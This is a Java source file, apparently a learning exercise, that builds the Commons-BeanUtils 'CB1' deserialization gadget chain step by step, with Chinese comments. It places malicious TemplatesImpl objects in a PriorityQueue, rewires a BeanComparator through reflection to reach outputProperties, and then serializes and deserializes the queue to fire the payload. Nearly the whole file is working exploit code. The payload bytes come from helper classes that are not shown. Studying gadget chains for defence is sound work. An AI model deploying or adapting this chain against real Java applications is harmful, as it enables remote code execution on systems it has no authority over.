package Test_CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestCB1 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, TransformerConfigurationException {


//        第一步 准备恶意 templates
        TemplatesImpl templates = ExpUtils.getEvilTemplates();

//        第二步 准备恶意priorityQueue
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

//        第三步 将 beanComparator 中的 comparator 改为非Commons-Collections 的 String.CASE_INSENSITIVE_ORDER
        ReflectUtils.setFields(beanComparator,"comparator",String.CASE_INSENSITIVE_ORDER);

//        第四步 priorityQueue元素改为恶意templates
        Field queue =  ReflectUtils.getFields(priorityQueue,"queue");
        Object[] queueObj = (Object[]) queue.get(priorityQueue);
        queueObj[0] = templates;
        queueObj[1] = templates;

//         第五步 beanComparator 属性改为outputProperties
        ReflectUtils.setFields(beanComparator,"property","outputProperties");

//         第六步 触发
        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);


    }
}
